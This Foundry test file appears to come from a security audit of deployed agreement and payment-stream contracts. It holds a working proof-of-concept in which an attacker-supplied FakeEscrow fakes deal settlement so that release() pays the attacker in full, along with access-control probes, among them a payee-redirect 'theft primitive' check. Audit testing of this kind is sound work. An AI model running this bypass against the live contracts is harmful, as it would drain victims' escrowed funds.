// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "../src/Mocks.sol";

// ROUND 12 — Team A (forge / on-chain).
// Part 1 — K-681 STEP 0 (MANDATORY FIRST, per Team C spec §4.1):
//   does the live Agreement accept a kind-4 (deal_settled) condition whose
//   target is an attacker FakeEscrow that always reports status 2, and does
//   release() then pay out in full without any real Bull deal settling?
// Part 2 — Streams access-control probe (fabricated storage, NO createStream):
//   struct stream at keccak(id,1)+0..6; matrix withdraw/cancel/pause/resume
//   x {payer, payee, arbiter, stranger} x kind {0..3}; plus 0xadfecd8a,
//   0x1e83409a, 0x28079e4a, 0x409fa6b8. Throwaway Anvil keys only.

// FakeEscrow lives in ../src/Mocks.sol (shared with the node runners).

contract Round12ATest is Test {
    address constant AGREEMENT = 0x84C6D5dAf99BC65ed3A1D26Ca88ffa834D143999;
    address constant ESCROW_V3 = 0xd961cA37e339E14e0D3478383a252E218fe7aa4a;

    uint256 constant VICTIM_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant ATTACKER_PK = 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a;
    address victim;
    address attacker;
    MockERC20 token;

    struct Cond { uint8 kind; address target; bytes data; uint256 value; }
    struct AgrParams { address payee; address asset; uint256 amount; uint64 expiry; bytes32 termsHash; Cond[] conditions; }
    struct AgrQuote { uint256 feeWei; uint64 expiry; bytes sig; }

    function setUp() public {
        vm.chainId(4663);
        victim = vm.addr(VICTIM_PK);
        attacker = vm.addr(ATTACKER_PK);
        vm.etch(AGREEMENT, vm.parseBytes(vm.readFile("bytecode/agreement-84c6-zerofee.hex")));
        vm.store(AGREEMENT, bytes32(uint256(9)), bytes32(uint256(1)));
        vm.store(AGREEMENT, bytes32(uint256(0)), bytes32(uint256(1)));
        token = new MockERC20();
        token.mint(victim, 1000000 ether);
        vm.deal(victim, 100 ether);
        vm.deal(attacker, 10 ether);
        vm.warp(1000);
    }

    function _agrQuote() internal view returns (AgrQuote memory) {
        return AgrQuote({feeWei: 0, expiry: uint64(block.timestamp + 3600), sig: new bytes(65)});
    }
    function _createAgreement(address from, address payee_, address asset, uint256 amount, Cond[] memory conds) internal returns (bool ok, uint256 id) {
        AgrParams memory p = AgrParams({payee: payee_, asset: asset, amount: amount,
            expiry: uint64(block.timestamp + 30 days), termsHash: bytes32(uint256(1)), conditions: conds});
        vm.prank(from);
        token.approve(AGREEMENT, amount);
        vm.prank(from);
        bytes memory ret;
        (ok, ret) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0x8952f925), p, _agrQuote()));
        if (ok) id = abi.decode(ret, (uint256));
    }
    function _release(uint256 id) internal returns (bool ok) {
        (ok,) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0x37bdc99b), id));
    }
    function _kind4(address target, uint256 dealId) internal pure returns (Cond[] memory c) {
        c = new Cond[](1);
        c[0] = Cond({kind: 4, target: target, data: "", value: dealId});
    }

    // ============ K-681 STEP 0 — kind-4 target = FakeEscrow (always status 2) ====
    function testK681Step0FakeEscrowRelease() public {
        FakeEscrow fake = new FakeEscrow(2);
        uint256 amt = 500 ether;
        (bool ok, uint256 id) = _createAgreement(victim, attacker, address(token), amt, _kind4(address(fake), 7));
        assertTrue(ok, "STEP0: creation with kind-4 target=FakeEscrow must succeed (no target validation at creation)");
        bool rok = _release(id);
        assertTrue(rok, "STEP0: release must succeed on FakeEscrow status-2 without any real Bull deal settling");
        assertEq(token.balanceOf(attacker), amt, "STEP0: payee receives the full 500 via FakeEscrow");
        emit log_named_uint("K-681 STEP0 FakeEscrow status-2 release (token to payee)", 500);
    }

    // FakeEscrow reporting status 0 (not settled) must NOT release.
    function testK681FakeEscrowStatusZeroControl() public {
        FakeEscrow fake = new FakeEscrow(0);
        uint256 amt = 500 ether;
        (bool ok, uint256 id) = _createAgreement(victim, attacker, address(token), amt, _kind4(address(fake), 7));
        assertTrue(ok, "creation with FakeEscrow status-0 must succeed");
        assertFalse(_release(id), "release must fail when the target reports status 0");
        assertEq(token.balanceOf(attacker), 0, "payee receives nothing");
        emit log_string("K-681 control: FakeEscrow status-0 blocks release");
    }

    // FakeEscrow reporting status 1 (open, not settled) must NOT release.
    function testK681FakeEscrowStatusOneControl() public {
        FakeEscrow fake = new FakeEscrow(1);
        uint256 amt = 500 ether;
        (bool ok, uint256 id) = _createAgreement(victim, attacker, address(token), amt, _kind4(address(fake), 7));
        assertTrue(ok, "creation with FakeEscrow status-1 must succeed");
        assertFalse(_release(id), "release must fail when the target reports status 1 (open)");
        assertEq(token.balanceOf(attacker), 0, "payee receives nothing");
        emit log_string("K-681 control: FakeEscrow status-1 (open) blocks release");
    }

    // Target = EOA (no code): staticcall returns empty -> condition false.
    function testK681TargetEOAControl() public {
        uint256 amt = 500 ether;
        (bool ok, uint256 id) = _createAgreement(victim, attacker, address(token), amt, _kind4(attacker, 7));
        assertTrue(ok, "creation with EOA target must succeed");
        assertFalse(_release(id), "release must fail when the target has no deals() code");
        assertEq(token.balanceOf(attacker), 0, "payee receives nothing");
        emit log_string("K-681 control: EOA target blocks release");
    }

    // Honest-target analog in forge: target = real escrow v3 etched, deal id
    // that does not exist there -> deals() returns all-zero (status 0).
    function testK681HonestEscrowNoDealControl() public {
        vm.etch(ESCROW_V3, vm.parseBytes(vm.readFile("bytecode/escrow-v3.hex")));
        uint256 amt = 500 ether;
        (bool ok, uint256 id) = _createAgreement(victim, attacker, address(token), amt, _kind4(ESCROW_V3, 7));
        assertTrue(ok, "creation with real-escrow target must succeed");
        assertFalse(_release(id), "release must fail: real escrow deal 7 does not exist (status 0)");
        assertEq(token.balanceOf(attacker), 0, "payee receives nothing");
        emit log_string("K-681 control: real escrow, nonexistent deal blocks release");
    }

    // ============ K-637 (fresh-eyes) — is kind-1 (attest) `value` read on-chain?
    // deal() checks kind+target for arbiter_escrow/performance_bond/milestones
    // but NEVER checks `value`. agree() demands value==0 for attest
    // (#matchConditions: e.v undefined -> v must be 0). If the Agreement
    // ignores value for kind 1, the unchecked value is harmless; if it reads
    // value as an attestation index, a swapped value can only BLOCK release
    // (griefing), never steal — the attester is still the victim-chosen arbiter.
    function _kind1(address target, uint256 value_) internal pure returns (Cond[] memory c) {
        c = new Cond[](1);
        c[0] = Cond({kind: 1, target: target, data: "", value: value_});
    }
    function _attest(uint256 id, uint256 index, address from) internal returns (bool ok) {
        vm.prank(from);
        (ok,) = AGREEMENT.call(abi.encodeWithSelector(bytes4(0xa3bb24cc), id, index));
    }
    function testK637Kind1ValueZeroControl() public {
        uint256 amt = 500 ether;
        (bool ok, uint256 id) = _createAgreement(victim, attacker, address(token), amt, _kind1(attacker, 0));
        assertTrue(ok, "creation kind-1 value=0 must succeed");
        assertTrue(_attest(id, 0, attacker), "attest(0) by the target must succeed");
        assertTrue(_release(id), "release must succeed after attest with value=0");
        assertEq(token.balanceOf(attacker), amt, "payee receives the full 500");
        emit log_string("K-637 control: kind-1 value=0, attest(0), release OK");
    }
    function testK637Kind1Value999Attest0() public {
        uint256 amt = 500 ether;
        (bool ok, uint256 id) = _createAgreement(victim, attacker, address(token), amt, _kind1(attacker, 999));
        assertTrue(ok, "creation kind-1 value=999 must succeed");
        bool aok = _attest(id, 0, attacker);
        bool rok = _release(id);
        if (rok) emit log_string("K-637: kind-1 value=999 + attest(0) -> release SUCCEEDS (value ignored on-chain)");
        else emit log_string("K-637: kind-1 value=999 + attest(0) -> release FAILS (value is read on-chain)");
        emit log_named_uint("K-637 value=999 attest(0) ok", aok ? 1 : 0);
        emit log_named_uint("K-637 value=999 release ok", rok ? 1 : 0);
    }
    function testK637Kind1Value999Attest999() public {
        uint256 amt = 500 ether;
        (bool ok, uint256 id) = _createAgreement(victim, attacker, address(token), amt, _kind1(attacker, 999));
        assertTrue(ok, "creation kind-1 value=999 must succeed");
        bool aok = _attest(id, 999, attacker);
        bool rok = _release(id);
        if (rok) emit log_string("K-637: kind-1 value=999 + attest(999) -> release SUCCEEDS (value = attestation index)");
        else emit log_string("K-637: kind-1 value=999 + attest(999) -> release FAILS (value means something else)");
        emit log_named_uint("K-637 value=999 attest(999) ok", aok ? 1 : 0);
        emit log_named_uint("K-637 value=999 release ok", rok ? 1 : 0);
    }
}

// ================= STREAMS ACCESS-CONTROL PROBE =================
contract StreamAccessTest is Test {
    address constant STREAM = 0xF02aD48D7Ae63F17941E78AAF228C1450Db13891;

    uint256 constant PAYER_PK = 0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80;
    uint256 constant PAYEE_PK = 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a;
    uint256 constant ARB_PK = 0x47e179ec1974f892c2cd3b0cf1a4ec6a36e72a0a0d26ccaa2aa5c8ad6b9b47a8;
    address payer; address payee; address arbiter; address stranger;
    MockERC20 token;

    bytes4 constant SEL_WITHDRAW = 0x2e1a7d4d;
    bytes4 constant SEL_CANCEL = 0x40e58ee5;
    bytes4 constant SEL_PAUSE = 0x136439dd;
    bytes4 constant SEL_RESUME = 0x414000b5;
    bytes4 constant SEL_STREAM = 0x2d94d8b5;
    bytes4 constant SEL_VESTED = 0x968fb8ba;
    bytes4 constant SEL_WITHDRAWABLE = 0xf11988e0;
    bytes4 constant SEL_PAUSED = 0x409fa6b8;
    bytes4 constant SEL_REDIRECT = 0xadfecd8a;
    bytes4 constant SEL_CLAIM = 0x1e83409a;
    bytes4 constant SEL_UNK2807 = 0x28079e4a;

    function setUp() public {
        vm.chainId(4663);
        payer = vm.addr(PAYER_PK);
        payee = vm.addr(PAYEE_PK);
        arbiter = vm.addr(ARB_PK);
        stranger = vm.addr(0x9999);
        vm.etch(STREAM, vm.parseBytes(vm.readFile("bytecode/stream.hex")));
        vm.store(STREAM, bytes32(uint256(4)), bytes32(uint256(1))); // reentrancy guard unlocked
        token = new MockERC20();
        token.mint(payer, 1000000 ether);
        token.mint(STREAM, 100000 ether); // contract holds funds to pay out
        vm.deal(payer, 100 ether);
        vm.deal(payee, 10 ether);
        vm.deal(arbiter, 10 ether);
        vm.deal(stranger, 10 ether);
        vm.warp(1000);
    }

    function _base(uint256 id) internal pure returns (bytes32) {
        return keccak256(abi.encode(id, uint256(1)));
    }
    // CONFIRMED layout (probe + transfer-helper disassembly):
    //   +0 payer, +1 payee, +2 arbiter, +3 token, +4 amount, +5 withdrawn,
    //   +6 = start(uint64 @0) | end(uint64 @8) | pausedAt(uint64 @16) | kind(uint8 @24).
    // (Offset 8 is the END timestamp, not a duration: vested halfway through
    //  a [1000, 87400] stream is exactly 500/1000. Layout A (+2 token) made
    //  withdraw "succeed" while paying nobody — the transfer CALLed the
    //  arbiter EOA as if it were a token.)
    function _fabricate(uint256 id, uint256 amount_, uint256 withdrawn_, uint64 start_, uint64 end_, uint64 pausedAt_, uint8 kind_) internal {
        bytes32 b = _base(id);
        vm.store(STREAM, b, bytes32(uint256(uint160(payer))));
        vm.store(STREAM, bytes32(uint256(b) + 1), bytes32(uint256(uint160(payee))));
        vm.store(STREAM, bytes32(uint256(b) + 2), bytes32(uint256(uint160(arbiter))));
        vm.store(STREAM, bytes32(uint256(b) + 3), bytes32(uint256(uint160(address(token)))));
        vm.store(STREAM, bytes32(uint256(b) + 4), bytes32(amount_));
        vm.store(STREAM, bytes32(uint256(b) + 5), bytes32(withdrawn_));
        uint256 packed = uint256(start_) | (uint256(end_) << 64) | (uint256(pausedAt_) << 128) | (uint256(kind_) << 192);
        vm.store(STREAM, bytes32(uint256(b) + 6), bytes32(packed));
    }
    function _callAs(address who, bytes memory data) internal returns (bool ok, bytes memory ret) {
        vm.prank(who);
        (ok, ret) = STREAM.call(data);
    }
    function _streamWords(uint256 id) internal returns (uint256[10] memory w) {
        (bool ok, bytes memory ret) = STREAM.call(abi.encodeWithSelector(SEL_STREAM, id));
        require(ok && ret.length == 320, "stream() must return 10 words");
        for (uint256 i; i < 10; i++) w[i] = abi.decode(_slice(ret, i * 32), (uint256));
    }
    function _slice(bytes memory b, uint256 off) internal pure returns (bytes memory) {
        bytes memory out = new bytes(32);
        for (uint256 i; i < 32; i++) out[i] = b[off + i];
        return out;
    }
    function _uintView(bytes4 sel, uint256 id) internal returns (bool ok, uint256 v) {
        bytes memory ret;
        (ok, ret) = STREAM.call(abi.encodeWithSelector(sel, id));
        if (ok && ret.length == 32) v = abi.decode(ret, (uint256));
    }

    // ---- layout echo: stream() must return exactly what was fabricated ----
    function testStreamLayoutEcho() public {
        _fabricate(1, 1000 ether, 111 ether, 1000, 87400, 0, 1);
        uint256[10] memory w = _streamWords(1);
        assertEq(address(uint160(w[0])), payer, "word0 = payer");
        assertEq(address(uint160(w[1])), payee, "word1 = payee");
        assertEq(address(uint160(w[2])), arbiter, "word2 = arbiter");
        assertEq(address(uint160(w[3])), address(token), "word3 = token");
        assertEq(w[4], 1000 ether, "word4 = amount");
        assertEq(w[5], 111 ether, "word5 = withdrawn");
        assertEq(w[6], 1000, "word6 = start");
        assertEq(w[7], 87400, "word7 = end");
        assertEq(w[8], 0, "word8 = pausedAt");
        assertEq(w[9], 1, "word9 = kind");
        emit log_string("layout echo OK: +0 payer +1 payee +2 arbiter +3 token; +6 = start|end|pausedAt|kind");
    }

    // ---- vested / withdrawable semantics per kind (mid-stream) ----
    function testStreamVestedSemantics() public {
        vm.warp(1000 + 43200); // halfway through a [1000, 87400] stream
        _fabricate(11, 1000 ether, 0, 1000, 87400, 0, 1);
        (bool ok1, uint256 v1) = _uintView(SEL_VESTED, 11);
        assertTrue(ok1, "vested() must not revert for kind 1");
        assertEq(v1, 500 ether, "kind 1 halfway: vested = 500");
        (bool okw, uint256 w1) = _uintView(SEL_WITHDRAWABLE, 11);
        assertTrue(okw, "withdrawable() must not revert for kind 1");
        assertEq(w1, 500 ether, "kind 1 halfway: withdrawable = 500");
        _fabricate(12, 1000 ether, 0, 1000, 87400, 0, 0);
        (, uint256 v0) = _uintView(SEL_VESTED, 12);
        assertEq(v0, 0, "kind 0: vested = 0");
        _fabricate(13, 1000 ether, 200 ether, 1000, 87400, 0, 2);
        (, uint256 v2) = _uintView(SEL_VESTED, 13);
        assertEq(v2, 200 ether, "kind 2 (cancelled): vested = withdrawn");
        emit log_named_uint("vested kind1 halfway", v1);
    }

    // ---- withdraw matrix: kind 0..3 x caller; funds must only ever go to payee ----
    function testStreamWithdrawMatrix() public {
        vm.warp(1000 + 43200);
        address[4] memory callers = [payer, payee, arbiter, stranger];
        string[4] memory names = ["payer", "payee", "arbiter", "stranger"];
        for (uint256 k; k < 4; k++) {
            for (uint256 c; c < 4; c++) {
                uint256 id = 100 + k * 10 + c;
                _fabricate(id, 1000 ether, 0, 1000, 87400, 0, uint8(k));
                uint256 payeeBefore = token.balanceOf(payee);
                uint256 strangerBefore = token.balanceOf(stranger);
                uint256 arbBefore = token.balanceOf(arbiter);
                uint256 payerBefore = token.balanceOf(payer);
                (bool ok,) = _callAs(callers[c], abi.encodeWithSelector(SEL_WITHDRAW, id));
                uint256 payeeDelta = token.balanceOf(payee) - payeeBefore;
                assertEq(token.balanceOf(stranger) - strangerBefore, 0, "withdraw must never pay a stranger");
                assertEq(token.balanceOf(arbiter) - arbBefore, 0, "withdraw must never pay the arbiter");
                assertEq(token.balanceOf(payer) - payerBefore, 0, "withdraw must never pay the payer");
                emit log_named_string("withdraw kind", string(abi.encodePacked(names[c], " k=", bytes1(uint8(48 + k)))));
                emit log_named_uint("  ok", ok ? 1 : 0);
                emit log_named_uint("  payeeDelta", payeeDelta);
                if (k == 1) {
                    assertTrue(ok, "kind 1 withdraw must succeed for any caller (permissionless, pays payee)");
                    assertEq(payeeDelta, 500 ether, "kind 1 withdraw pays vested 500 to payee");
                } else {
                    assertFalse(ok, "non-kind-1 withdraw must revert");
                    assertEq(payeeDelta, 0, "failed withdraw pays nobody");
                }
            }
        }
    }

    // ---- cancel matrix: only payer; payee gets vested, payer gets remainder ----
    function testStreamCancelMatrix() public {
        vm.warp(1000 + 43200);
        address[4] memory callers = [payer, payee, arbiter, stranger];
        for (uint256 c; c < 4; c++) {
            uint256 id = 200 + c;
            _fabricate(id, 1000 ether, 0, 1000, 87400, 0, 1);
            uint256 payeeBefore = token.balanceOf(payee);
            uint256 payerBefore = token.balanceOf(payer);
            (bool ok,) = _callAs(callers[c], abi.encodeWithSelector(SEL_CANCEL, id));
            uint256 payeeDelta = token.balanceOf(payee) - payeeBefore;
            uint256 payerDelta = token.balanceOf(payer) - payerBefore;
            assertEq(token.balanceOf(stranger), 0, "cancel must never pay a stranger");
            assertEq(token.balanceOf(arbiter), 0, "cancel must never pay the arbiter");
            emit log_named_uint("cancel caller idx (0=payer,1=payee,2=arb,3=stranger)", c);
            emit log_named_uint("  ok", ok ? 1 : 0);
            emit log_named_uint("  payeeDelta", payeeDelta);
            emit log_named_uint("  payerDelta", payerDelta);
            if (c == 0) {
                assertTrue(ok, "cancel by payer must succeed");
                assertEq(payeeDelta, 500 ether, "cancel: payee gets vested 500");
                assertEq(payerDelta, 500 ether, "cancel: payer gets remainder 500");
                uint256[10] memory w = _streamWords(id);
                assertEq(w[9], 2, "cancel sets kind=2");
            } else {
                assertFalse(ok, "cancel by non-payer must revert");
                assertEq(payeeDelta + payerDelta, 0, "failed cancel pays nobody");
            }
        }
    }

    // ---- pause matrix: kind 0..3 x caller; record who can pause ----
    function testStreamPauseMatrix() public {
        vm.warp(1000 + 43200);
        address[4] memory callers = [payer, payee, arbiter, stranger];
        for (uint256 k; k < 4; k++) {
            for (uint256 c; c < 4; c++) {
                uint256 id = 300 + k * 10 + c;
                _fabricate(id, 1000 ether, 0, 1000, 87400, 0, uint8(k));
                (bool ok,) = _callAs(callers[c], abi.encodeWithSelector(SEL_PAUSE, id));
                uint256 pausedAt = 0;
                if (ok) pausedAt = _streamWords(id)[8];
                emit log_named_uint("pause kind", k);
                emit log_named_uint("  caller idx", c);
                emit log_named_uint("  ok", ok ? 1 : 0);
                emit log_named_uint("  pausedAt", pausedAt);
                if (k == 1 && c == 2) {
                    assertTrue(ok, "kind-1 pause by the arbiter must succeed");
                    assertEq(pausedAt, 1000 + 43200, "pause sets pausedAt = now");
                } else {
                    assertFalse(ok, "pause must revert for non-arbiter callers and non-kind-1 streams");
                }
            }
        }
    }

    // ---- resume matrix: paused stream (pausedAt != 0), kind 1, x caller ----
    function testStreamResumeMatrix() public {
        vm.warp(1000 + 43200);
        address[4] memory callers = [payer, payee, arbiter, stranger];
        for (uint256 c; c < 4; c++) {
            uint256 id = 400 + c;
            _fabricate(id, 1000 ether, 0, 1000, 87400, 2000, 1);
            (bool ok,) = _callAs(callers[c], abi.encodeWithSelector(SEL_RESUME, id));
            uint256[10] memory w = _streamWords(id);
            emit log_named_uint("resume caller idx", c);
            emit log_named_uint("  ok", ok ? 1 : 0);
            emit log_named_uint("  pausedAtAfter", w[8]);
            emit log_named_uint("  startAfter", w[6]);
            emit log_named_uint("  endAfter", w[7]);
            if (c == 2) {
                assertTrue(ok, "resume by the arbiter must succeed");
                assertEq(w[8], 0, "resume clears pausedAt");
            } else {
                assertFalse(ok, "resume by non-arbiter must revert");
                assertEq(w[8], 2000, "failed resume leaves pausedAt untouched");
            }
        }
    }

    // ---- 0xadfecd8a(id, newAddr): who can redirect the payee slot? ----
    function testStreamRedirectPayee() public {
        address[4] memory callers = [payer, payee, arbiter, stranger];
        for (uint256 c; c < 4; c++) {
            uint256 id = 500 + c;
            _fabricate(id, 1000 ether, 0, 1000, 87400, 0, 1);
            (bool ok,) = _callAs(callers[c], abi.encodeWithSelector(SEL_REDIRECT, id, stranger));
            address payeeAfter = address(uint160(_streamWords(id)[1]));
            emit log_named_uint("redirect caller idx", c);
            emit log_named_uint("  ok", ok ? 1 : 0);
            emit log_named_address("  payeeAfter", payeeAfter);
            if (payeeAfter == stranger) {
                // If a stranger (or anyone but the payer) can redirect the
                // payee to themselves, that is a theft primitive: follow with
                // a withdraw and check where the funds land.
                vm.warp(1000 + 43200);
                uint256 strangerBefore = token.balanceOf(stranger);
                (bool wok,) = _callAs(stranger, abi.encodeWithSelector(SEL_WITHDRAW, id));
                emit log_named_uint("  follow-up withdraw ok", wok ? 1 : 0);
                emit log_named_uint("  strangerDelta", token.balanceOf(stranger) - strangerBefore);
            }
        }
    }

    // ---- 0x409fa6b8(id): paused view over mapping slot 2 ----
    function testStreamPausedView() public {
        bytes32 slot = keccak256(abi.encode(uint256(7), uint256(2)));
        vm.store(STREAM, slot, bytes32(uint256(1)));
        (bool ok, uint256 v) = _uintView(SEL_PAUSED, 7);
        assertTrue(ok, "paused() must not revert");
        assertEq(v, 1, "paused(7) reads mapping slot 2 = 1");
        (bool ok2, uint256 v2) = _uintView(SEL_PAUSED, 8);
        assertTrue(ok2, "paused() must not revert for unset id");
        assertEq(v2, 0, "paused(8) = 0 when unset");
        emit log_string("0x409fa6b8 = paused(uint256) over mapping slot 2");
    }

    // ---- 0x1e83409a(token): fee-claim over nested mapping slot 3 ----
    // Disassembly: guard = nested[token][caller] != 0 (revert 0xf9820cc1);
    // pays exactly that amount of `token` to the CALLER from the contract
    // balance and clears the entry (claim-once). It never pays a third party.
    function testStreamClaimFeeMapping() public {
        bytes32 outer = keccak256(abi.encode(address(token), uint256(3)));
        bytes32 nestedStranger = keccak256(abi.encode(stranger, outer));
        // outer-only non-zero, nested empty -> reverts (guard is on nested)
        vm.store(STREAM, outer, bytes32(uint256(100 ether)));
        (bool ok,) = _callAs(stranger, abi.encodeWithSelector(SEL_CLAIM, address(token)));
        assertFalse(ok, "claim with empty nested entry must revert");
        assertEq(token.balanceOf(stranger), 0, "failed claim pays nobody");
        // nested[stranger] = 100 -> stranger claims exactly their own 100
        vm.store(STREAM, nestedStranger, bytes32(uint256(100 ether)));
        uint256 streamBefore = token.balanceOf(STREAM);
        (bool ok2,) = _callAs(stranger, abi.encodeWithSelector(SEL_CLAIM, address(token)));
        assertTrue(ok2, "claim with a funded nested entry must succeed");
        assertEq(token.balanceOf(stranger), 100 ether, "claim pays the caller their own nested amount");
        assertEq(token.balanceOf(STREAM), streamBefore - 100 ether, "claim is funded from the contract balance");
        // double-claim must revert (entry cleared)
        (bool ok3,) = _callAs(stranger, abi.encodeWithSelector(SEL_CLAIM, address(token)));
        assertFalse(ok3, "second claim must revert (entry cleared)");
        assertEq(token.balanceOf(stranger), 100 ether, "no double payout");
        // a different caller cannot claim the stranger's entry
        bytes32 nestedPayer = keccak256(abi.encode(payer, outer));
        vm.store(STREAM, nestedPayer, bytes32(uint256(50 ether)));
        (bool ok4,) = _callAs(stranger, abi.encodeWithSelector(SEL_CLAIM, address(token)));
        assertFalse(ok4, "stranger cannot claim the payer's nested entry");
        emit log_string("0x1e83409a = self-only fee claim: pays nested[token][caller] to caller, claim-once; no cross-account theft");
    }

    // ---- 0x28079e4a: try plausible shapes (reverts on a bare uint256) ----
    function testStreamUnk28079e4a() public {
        (bool ok1,) = STREAM.call(abi.encodeWithSelector(SEL_UNK2807, uint256(1)));
        emit log_named_uint("28079e4a(uint256) ok", ok1 ? 1 : 0);
        (bool ok2, bytes memory r2) = STREAM.call(abi.encodeWithSelector(SEL_UNK2807, payer));
        emit log_named_uint("28079e4a(address) ok", ok2 ? 1 : 0);
        if (ok2) emit log_named_bytes32("  ret0", abi.decode(r2, (bytes32)));
        (bool ok3, bytes memory r3) = STREAM.call(abi.encodeWithSelector(SEL_UNK2807, uint256(1), payer));
        emit log_named_uint("28079e4a(uint256,address) ok", ok3 ? 1 : 0);
        if (ok3) emit log_named_bytes32("  ret0", abi.decode(r3, (bytes32)));
        (bool ok4,) = STREAM.call(abi.encodeWithSelector(SEL_UNK2807, abi.encode(payer, payee)));
        emit log_named_uint("28079e4a(tuple) ok", ok4 ? 1 : 0);
    }
}
